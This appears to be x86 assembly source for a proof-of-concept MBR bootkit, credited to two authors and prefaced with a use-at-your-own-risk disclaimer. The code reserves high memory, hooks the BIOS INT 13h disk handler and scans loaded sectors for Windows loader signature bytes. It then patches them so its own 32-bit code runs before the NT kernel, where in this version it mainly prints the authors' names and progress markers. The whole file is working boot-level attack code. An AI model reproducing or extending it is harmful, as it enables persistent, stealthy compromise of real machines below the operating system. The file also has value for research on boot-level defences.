;Authors: Nitin Kumar & Vipin Kumar
;NOTE:- We are not respomsible for anything.Use at your own risk
;If you develop anything using this code, please remember to give necessary credit to the authors

 	cli
        xor bx,bx
        mov ss,bx
  	mov [ss:0x7bfe],sp
      	mov sp,0x7bfe               
        push ds
        pushad
        mov ds,bx
      	mov ax,[0x413]
        sub ax,2
        mov [0x413],ax
        shl ax,0x6
        mov ax,CODEBASEIN1MB
        mov es,ax
        mov [0x7c00 + codereloc],ax
        cld
        mov si,0x7c00
        xor di,di
      	mov cx,0x400        ;number of bytes 2 copy to new location this is in words currently 2 kbs are loaded
        rep movsw
  	sti
      	mov ax,0x201
        mov cl,0x2
        cdq
        cli
    	mov eax,[0x4c]
  	mov [es:INT13INTERRUPTVALUE],eax
	mov word [0x4c], newint13handler
    	mov [0x4e],es
        sti
 directjumpwithouthook:
        push es
      	push word newmemorycodestart
        retf
newmemorycodestart:
        mov es,dx
        mov ax,0x201
        dec cx
        mov dl,0x80
        mov bh,0x7c
        int 0x13
        
        popad
        pop ds
        pop sp
  	jmp 0x0:0x7c00    ;jmp to original mbr from hard drive
 
 newint13handler: 	    
        pushf
  	cmp ah,0x42
        jz processint13request
        cmp ah,0x2
        jz processint13request
        popf
        jmp 0x0:0x0 ;jmp back to original handler;thse zero are filled above
INT13INTERRUPTVALUE EQU $-4
processint13request:
        mov [cs:STOREAH],ah
        popf
        pushf
  	call far [cs:INT13INTERRUPTVALUE] ;this jumps back to original int13 ivt
        jc returnback ;since request failed just go back
        pushf
        cli
        push es
        pusha
        mov ah,0x0       ;   this zero gets fillled by original ah code passed
STOREAH EQU $-1      
        cmp ah,0x42
        jnz notextrequest
        lodsw
        lodsw
        les bx,[si]
      
notextrequest:
        test al,al
        jng scandone
        cld
        mov cl,al
        mov al,0x8b
        shl cx,0x9
        mov di,bx
scanloop:
        repne scasb
        jnz scandone
        cmp dword [es:di],0x74f685f0     ;these are signature bytes
        jnz scanloop
        cmp word [es:di+0x4],0x8021 
        jnz scanloop
        mov word [es:di-0x1],0x15ff
 	mov eax,cs
       	shl eax,0x4
        or [cs:updatecodeloc],eax
        add ax,CODE32START
        mov [cs: dword_E5],eax
        sub ax,0x4
        mov [es:di+0x1],eax
scandone:            ;pop pushed registers and get out
        popa
        pop es
        popf
returnback:  
     	retf 0x2


db 90h  ; to get alignment, i suppose
db 90h
dword_E5:     dd 0      ;something extra
    

                
  


USE32



;########################################################
;##  32 bit Code,is called before execution of KERNEL  ##
;########################################################
		
CODE32START:   
		pushfd
        	pushAd
 		mov     word [ds:0B8000h], 0x024E ; 
                mov     word [ds:0B8002h], 0x0269
                mov     word [ds:0B8004h], 0x0274
                mov     word [ds:0B8006h], 0x0269
                mov     word [ds:0B8008h], 0x026E
                
                 
                mov     word [ds:0B800Ch], 0x024B ; 
                mov     word [ds:0B800Eh], 0x0275
                mov     word [ds:0B8010h], 0x026D
                mov     word [ds:0B8012h], 0x0261
                mov     word [ds:0B8014h], 0x0272
                
                 
                mov     word [ds:0B8018h], 0x0226   ;; for &
                 
                 
                mov     word [ds:0B801Ch], 0x0256 ; 
                mov     word [ds:0B801Eh], 0x0269
                mov     word [ds:0B8020h], 0x0270
                mov     word [ds:0B8022h], 0x0269
                mov     word [ds:0B8024h], 0x026E
                 
                 
                mov     word [ds:0B8028h], 0x024B ; 
                mov     word [ds:0B802Ah], 0x0275
                mov     word [ds:0B802Ch], 0x026D
                mov     word [ds:0B802Eh], 0x0261
                mov     word [ds:0B8030h], 0x0272
                 
                 
                mov     word [ds:0B80A2h], 0231h     ;  Display 1 so we now we found the NT base addresss
                mov     word [ds:0B80A4h], 0232h     ;  Display 2 so we now we found the function we overwrite temporarily
                mov     word [ds:0B80A6h], 0233h     ;  Display 3 so we now we found the textual data in NTOSkrnl to overwrite
                mov     word [ds:0B80A8h], 0234h     ;  Display 4 so we now we patched up successfully
         
        
                 
		popad
		popfd

		mov		esi, eax
		test		eax, eax
		jnz		short Patch_done_nojz

		pushfd
		add		dword [esp+4], 21h
		popfd
Patch_done_nojz:
		ret


;extra baggage required to get the job done                

updatecodeloc :
dd 0


codereloc:
dd 0


codeends EQU $ 




CODEBASEIN1MB EQU 0x9e00 ;
CODEBASEIN1MBEXACT EQU 0x9e000     ;;this is the exact in memory
 